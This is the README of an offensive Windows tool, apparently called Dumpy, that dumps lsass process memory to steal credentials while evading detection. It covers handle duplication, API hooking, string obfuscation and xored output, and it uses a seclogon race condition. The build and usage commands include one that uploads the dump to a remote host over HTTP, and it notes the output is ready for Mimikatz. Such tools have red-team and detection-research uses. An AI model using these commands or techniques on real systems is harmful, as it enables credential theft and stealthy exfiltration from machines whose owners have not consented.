# Description

This tool dynamically calls MiniDumpWriteDump to dump lsass memory content. This process is done without opening a new process handle to lsass and using [DInvoke_rs](https://github.com/Kudaes/DInvoke_rs) to make it harder to detect its malicious behaviour. In order to obtain a valid process handle without calling OpenProcess over lsass, all process handles in the system are analyzed using NtQuerySystemInformation, NtDuplicateObject, NtQueryObject and QueryFullProcessImageNameW.

NtOpenProcess is hooked before calling MiniDumpWriteDump to avoid the opening of a new process handle over lsass.

NTFS Transaction are used in order to xor the memory dump before storing it on disk or sending it throught HTTP.

**Support added for both x86 and x64**.

# Compilation 

Since we are using [LITCRYPT](https://github.com/anvie/litcrypt.rs) plugin to obfuscate string literals, it is required to set up the environment variable LITCRYPT_ENCRYPT_KEY before compiling the code:

	C:\Users\User\Desktop\Dumpy\dumpy> set LITCRYPT_ENCRYPT_KEY="yoursupersecretkey"

After that, simply compile the code and execute it:

	C:\Users\User\Desktop\Dumpy\dumpy> cargo build --release
	C:\Users\User\Desktop\Dumpy\dumpy\target\x86_64-pc-windows-msvc\release> dumpy.exe -h

In case that you want to compile the tool for a x86 system, modify the value of the option "target" in the file .cargo\config (e.g: target = "i686-pc-windows-msvc").

# Usage: dumpy.exe --dump|--decrypt [options]

Options:
    -h, --help          Print this help menu.
        --dump          Dump lsass.
        --decrypt       Decrypt a previously generated dump file.
    -f, --force         Force seclogon's service to leak a lsass handle
                        through a race condition.
    -k, --key           Encryption key [default: 1234abcd]
    -i, --input         Encrypted dump file [default: c:\temp\input.txt]
    -o, --output        Destination path [default: c:\temp\output.txt]
    -u, --upload        Upload URL

Dumpy has two main actions:

- **dump**: It will execute the main logic to dump the lsass content. By default, it will store the result in a xored text file with a random name in the current directory. The option **upload** allows to send the memory content over HTTP to a remote host, avoiding the creation of the xored file on disk. I've used [this simple HTTP server](https://gist.github.com/smidgedy/1986e52bb33af829383eb858cb38775c) in order to handle the upload, but any other HTTP server that supports **multipart/form-data requests** will work.

		C:\Temp> dumpy.exe dump -k secretKey -u http://remotehost/upload

If you want to force the leakage of a handle to the lsass through the race condition in seclogon's service described by [Antonio Cocomazzi](https://twitter.com/splinter_code) in [this post](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html), just use the option **force**:

		C:\Temp> dumpy.exe dump -k secretKey -u http://remotehost/upload force

- **decrypt**: This action allows to obtain the decrypted memory dump in the same format that tools like Mimikatz would expect. As arguments it expects the xored memory dump, the encryption key and the output file path. In case the xored file has been uploaded using HTTP, **it is required to perform a base64 decoding of the content before this decryption process**.

		C:\Temp> dumpy.exe decrypt -i xored.txt -o decrypted.txt -k secretKey
